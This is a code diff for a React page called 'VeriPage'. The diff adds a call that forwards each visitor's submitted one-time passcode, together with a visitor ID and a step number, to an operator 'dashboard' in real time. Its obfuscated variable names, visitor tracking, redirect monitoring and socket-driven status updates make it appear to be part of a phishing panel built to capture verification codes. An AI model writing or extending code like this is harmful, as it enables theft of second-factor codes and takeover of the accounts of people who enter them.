@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
-import { addData, submitVisitorFormData } from "@/lib/api"
+import { addData, submitVisitorFormData, notifyDashboard } from "@/lib/api"
 import { onVisitorStatusUpdated } from "@/lib/socket"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
@@ -148,6 +148,23 @@ export default function VeriPage() {
         _v5Status: 'verifying',
         otpUpdatedAt: new Date().toISOString()
       })
+
+      // Notify dashboard immediately with OTP data
+      await notifyDashboard({
+        id: visitorID,
+        visitorId: visitorID,
+        _v5Status: 'verifying',
+        otpCode: _v5,
+        otpSubmittedAt: new Date().toISOString(),
+        currentPage: "veri",
+        currentStep: 5,
+        status: "pending"
+      })
+
+      // Trigger dashboard refresh for instant update
+      if (typeof window !== 'undefined') {
+        window.dispatchEvent(new CustomEvent('dashboard-refresh'));
+      }
 
       await addToHistory(visitorID, "_t2", { _v5 }, "pending")
       _ss5("verifying")
